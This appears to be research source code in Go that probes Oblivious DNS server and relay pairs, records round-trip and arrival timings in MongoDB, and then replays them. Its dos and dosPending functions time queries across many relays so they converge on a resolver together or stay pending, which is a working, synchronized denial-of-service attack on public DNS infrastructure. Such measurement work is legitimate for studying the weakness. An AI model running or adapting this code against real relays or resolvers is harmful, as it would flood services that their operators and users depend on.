package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/charmbracelet/log"
	"github.com/jedisct1/dlog"
	"github.com/miekg/dns"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
	"math/rand"
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type ResolveRequestBody struct {
	Name           string `json:"name"`
	Server         string `json:"server"`
	RelayName      string `json:"relayName"`
	ServerProtocol string `json:"serverProtocol"`
	QType          string `json:"qType"`
	TimeWait       int    `json:"timeWait"`
}

type ResolveResponseTXTBody struct {
	RecvTime int64 `json:"RecvTime"`
	RecvIp   struct {
		IP   string `json:"IP"`
		Port int    `json:"Port"`
		Zone string `json:"Zone"`
	} `json:"RecvIp"`
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func NowUnixMillion() int64 {
	return timeNow().UnixMilli()
}

func (app *App) buildQuery(server string, relay string, qtype uint16, multiLevel bool) *dns.Msg {
	// remove '.' in server and relay
	server = strings.ReplaceAll(server, ".", "-")
	relay = strings.ReplaceAll(relay, ".", "-")
	server = server[:min(len(server), 25)]
	relay = relay[:min(len(relay), 25)]

	domain := fmt.Sprintf("%s,%s,%s.test.xxt.asia", server, relay, RandStringRunes(8))
	// add many levels to trigger more query minimization
	if multiLevel {
		domain = "a.b.c.d.e.f.g.h.i.j.k.l." + domain
	}
	q := new(dns.Msg)
	q.SetQuestion(dns.Fqdn(domain), qtype)
	return q
}

func GCD(a, b int) int {
	for b != 0 {
		t := b
		b = a % b
		a = t
	}
	return a
}

type SRPair struct {
	Server string
	Relay  string
}

func (app *App) probe(probeId string, limit int, maxConcurrent int, multiLevel bool) {
	// Iterate through all servers and relays
	servers := app.proxy.serversInfo.inner
	relays := app.proxy.registeredRelays
	k := GCD(len(servers), len(relays))

	srList := make([]SRPair, 0)

	for start := 0; start < k; start++ {
		i, j := 0, start
		for {
			srList = append(srList, SRPair{
				Server: servers[i].Name,
				Relay:  relays[j].getName(),
			})

			i = (i + 1) % len(servers)
			j = (j + 1) % len(relays)

			if i == 0 && j == start {
				break
			}
		}
	}

	log.Debugf("Servers: %d, Relays: %d, Pairs: %d", len(servers), len(relays), len(srList))

	collection := app.mongoClient.Database("odns").Collection("probe")
	_, err := collection.Indexes().CreateOne(context.Background(), mongo.IndexModel{
		Keys: bson.D{{"probe_id", 1}},
	})
	if err != nil {
		log.Warnf("Unable to create index: %v", err)
	}

	failTimes := 0
	maxFailTimes := 5
	repeatProbeTimes := 10
	groupSize := min(len(servers), len(relays))
	iterTime := max(len(servers), len(relays))

	log.Infof("groupSize: %d, iterTime: %d", groupSize, iterTime)

	// Set max concurrent
	if maxConcurrent <= 0 {
		maxConcurrent = groupSize
	}
	countChannel := make(chan struct{}, maxConcurrent)
	wg := sync.WaitGroup{}
	wg.Add(min(iterTime*groupSize, limit))

	stats := app.StatsMap[probeId]
	stats.TotalCount.Add(int32(iterTime * groupSize * repeatProbeTimes))
	stats.Concurrent = maxConcurrent
	defer func() {
		stats.Running = false
	}()

	for i := 0; i < iterTime; i++ {
		for j := 0; j < groupSize; j++ {
			index := i*groupSize + j
			server := srList[index].Server
			relay := srList[index].Relay
			if stats.Running == false {
				return
			}
			go func(server string, relay string) {
				countChannel <- struct{}{}
				defer func() {
					<-countChannel
					wg.Done()
				}()

				for reqSeq := 0; reqSeq < repeatProbeTimes; reqSeq++ {
					if stats.Running == false {
						return
					}
					// Send query
					q := app.buildQuery(server, relay, dns.TypeTXT, multiLevel)

					sendTime := NowUnixMillion()
					resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q, 0)

					stats.CurrentCount.Add(1)
					if err != nil || resp == nil {
						log.Warnf("Probe failed: %s,%s, err: %v, resp: %v, realRtt: %dms", server, relay, err, resp, realRtt)
						failTimes += 1
						stats.FailCount.Add(1)
						if failTimes > maxFailTimes {
							break
						} else {
							reqSeq--
							continue
						}
					} else if len(resp.Answer) == 0 {
						stats.FailCount.Add(1)
						log.Warnf("Probe failed: %s,%s, resp.Answer is empty", server, relay)
						break
					} else {
						failTimes = 0
					}
					txtDataEncoded := resp.Answer[0].(*dns.TXT).Txt[0]
					txtData, err := base64.StdEncoding.DecodeString(txtDataEncoded)
					txtResp := &ResolveResponseTXTBody{}
					_ = json.Unmarshal(txtData, txtResp)

					// Save to mongodb
					_, err = collection.InsertOne(context.Background(), bson.M{
						"server":      server,
						"relay":       relay,
						"recv_ip":     txtResp.RecvIp.IP,
						"recv_port":   txtResp.RecvIp.Port,
						"send_time":   sendTime,
						"recv_time":   txtResp.RecvTime,
						"multi_level": multiLevel,
						"rtt":         realRtt,
						"probe_id":    probeId,
					})

					if err != nil {
						log.Warnf("Unable to save to mongodb: %v", err)
					}

					stats.SuccessCount.Add(1)

					log.Infof("[%s] [%d/%d]Probe success: %s,%s, realRtt: %dms", probeId, stats.CurrentCount.Load(),
						stats.TotalCount.Load(), server, relay, realRtt)
				}
			}(server, relay)

			// Limit the number of probes
			if limit > 0 && index+1 >= limit {
				goto finish
			}
		}
	}

finish:
	wg.Wait()
}

func (app *App) randomQueryTest(num int, qtype uint16) {
	wg := sync.WaitGroup{}
	wg.Add(num)
	for i := 0; i < num; i++ {
		go func() {
			defer wg.Done()
			// randomly select a server
			server := app.proxy.serversInfo.inner[rand.Intn(len(app.proxy.serversInfo.inner))].Name
			// randomly select a relay
			relay := app.proxy.registeredRelays[rand.Intn(len(app.proxy.registeredRelays))].getName()
			// build query
			q := app.buildQuery(server, relay, qtype, false)
			// send query
			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q, 0)
			if err != nil || resp == nil {
				dlog.Warn(fmt.Sprintf("server: %s, relay: %s, err: %v", server, relay, err))
				return
			}

			if len(resp.Answer) == 0 {
				dlog.Warn(fmt.Sprintf("server: %s, relay: %s, resp.Answer is empty", server, relay))
				return
			}

			var realArrivalTime int64 = 0
			var realResolverAddr = ""
			if q.Question[0].Qtype == dns.TypeTXT {
				txtDataEncoded := resp.Answer[0].(*dns.TXT).Txt[0]
				txtData, _ := base64.StdEncoding.DecodeString(txtDataEncoded)
				txtJson := &ResolveResponseTXTBody{}
				json.Unmarshal(txtData, txtJson)
				realArrivalTime = txtJson.RecvTime
				realResolverAddr = net.JoinHostPort(txtJson.RecvIp.IP, strconv.Itoa(txtJson.RecvIp.Port))
			}

			log.Printf("server: %s, relay: %s, realArrivalTime: %d, realResolverAddr: %s, realRtt: %d",
				server, relay, realArrivalTime, realResolverAddr, realRtt)
		}()
	}
	wg.Wait()
}

func (app *App) dos(qtype uint16, multiLevel bool) {
	ctx := context.Background()
	// creat mongodb client
	client, err := mongo.Connect(ctx, options.Client().ApplyURI(app.proxy.MongoUri))
	if err != nil {
		dlog.Errorf("Unable to connect to mongodb: %v", err)
		return
	}
	// find latest probe
	collection := client.Database("odns").Collection("prepare")
	cursor, err := collection.Find(ctx, bson.D{}, options.Find().SetSort(bson.D{{"probe_id", -1}}))
	if err != nil {
		dlog.Errorf("Unable to find latest probe: %v", err)
		return
	}
	var latestProbe bson.M
	if cursor.Next(ctx) {
		err := cursor.Decode(&latestProbe)
		if err != nil {
			return
		}
	}
	if latestProbe == nil {
		dlog.Errorf("Unable to find latest probe")
		return
	}

	probeId := latestProbe["probe_id"].(string)
	// find all with latest probe_id
	cursor, err = collection.Find(ctx, bson.M{"probe_id": probeId})
	if err != nil {
		dlog.Errorf("Unable to find latest probe: %v", err)
		return
	}
	var prepareList []bson.M
	if err = cursor.All(ctx, &prepareList); err != nil {
		dlog.Errorf("Unable to find latest probe: %v", err)
		return
	}

	// sort prepareList by send_time asc, using library
	sort.Slice(prepareList, func(i, j int) bool {
		return prepareList[i]["send_time"].(int32) < prepareList[j]["send_time"].(int32)
	})

	fmt.Println("Prepared list length: ", len(prepareList))

	// clear result collection
	collectionResult := client.Database("odns").Collection("result")
	if _, err := collectionResult.DeleteMany(ctx, bson.M{"probe_id": probeId}); err != nil {
		dlog.Errorf("Unable to clear collection result: %v", err)
		return
	}

	// start dos
	var totalCount atomic.Uint64
	var successCount atomic.Uint64

	// adjust sendTime and arrivalTime
	offset := NowUnixMillion() + 1000
	wg := sync.WaitGroup{}
	wg.Add(len(prepareList))
	for i, record := range prepareList {
		recordCopy := record

		go func(record bson.M, index int) {
			defer wg.Done()

			server := record["server"].(string)
			relay := record["relay"].(string)
			sendTime := int64(record["send_time"].(int32)) + offset
			arriveTime := int64(record["arrival_time"].(int32)) + offset
			rtt := record["rtt"].(float64)
			std := record["std"].(float64)

			// make a query for {server}-{relay}-{#randomStr}-{index}.test.xxt.asia
			q := app.buildQuery(server, relay, qtype, multiLevel)

			// Sleep until sendTime
			sleepTime := time.Duration(sendTime-NowUnixMillion()) * time.Millisecond
			if sleepTime > 0 {
				log.Info("Sleep time: ", sleepTime)
				time.Sleep(sleepTime)
			}

			realSendTime := NowUnixMillion()
			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q, 0)

			// Increase totalCount
			totalCount.Add(1)

			if err != nil || len(resp.Answer) == 0 {
				dlog.Warnf("Response is empty: %s,%s, err: %v, resp: %v, realRtt: %dms", server, relay, err, resp, realRtt)
				return
			}

			var realArriveTime int64
			var sendTimeDiff int64
			if q.Question[0].Qtype == dns.TypeA {
				realArriveTime = 0
				sendTimeDiff = 0
			} else {
				sendTimeDiff = realSendTime - sendTime
				txtDataEncoded := resp.Answer[0].(*dns.TXT).Txt[0]
				txtData, _ := base64.StdEncoding.DecodeString(txtDataEncoded)
				txtJson := &ResolveResponseTXTBody{}
				_ = json.Unmarshal(txtData, txtJson)
				realArriveTime = txtJson.RecvTime
			}

			// save temp result to local
			if _, err = collectionResult.InsertOne(ctx, bson.M{
				"server":           server,
				"relay":            relay,
				"send_time":        sendTime,
				"real_send_time":   realSendTime,
				"send_time_diff":   sendTimeDiff,
				"arrive_time":      arriveTime,
				"real_arrive_time": realArriveTime,
				"arrive_time_diff": realArriveTime - arriveTime,
				"real_rtt":         realRtt,
				"rtt":              rtt,
				"rtt_diff":         realRtt - int64(rtt),
				"std":              std,
				"probe_id":         probeId,
			}); err != nil {
				log.Errorf("Unable to save to mongodb: %v", err)
			}

			successCount.Add(1)
		}(recordCopy, i)
	}
	wg.Wait()

	log.Printf("DOS finised with %d/%d success: %d success rate: %.2f", totalCount.Load(), len(prepareList),
		successCount.Load(), float64(successCount.Load())/float64(totalCount.Load()))
	log.Printf("Params: qtype: %s, multiLevel: %v", dns.TypeToString[qtype], multiLevel)
}

func (app *App) dosPending(qtype uint16, multiLevel bool) {
	server := "myserver"
	relay := "myrelay"

	// make a query for {server}-{relay}-{#randomStr}.test.xxt.asia
	qps := 10
	sendInterval := 1000 / qps

	wg := sync.WaitGroup{}
	wg.Add(qps)
	for delay := 9000; delay > 0; delay -= sendInterval {
		// save intermediate result
		delay := delay
		time.Sleep(time.Duration(sendInterval) * time.Millisecond)
		go func() {
			q := app.buildQuery(server, relay, qtype, multiLevel)
			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q,
				time.Duration(delay)*time.Millisecond)
			if err != nil {
				log.Warn(err)
				return
			}

			if len(resp.Answer) == 0 {
				log.Warn("resp.Answer is empty")
				return
			}

			log.Info("Current progress: ", delay, "ms, realRtt: ", realRtt-int64(delay), "ms")
		}()
	}
	log.Info("DOS pending attack finised")
}
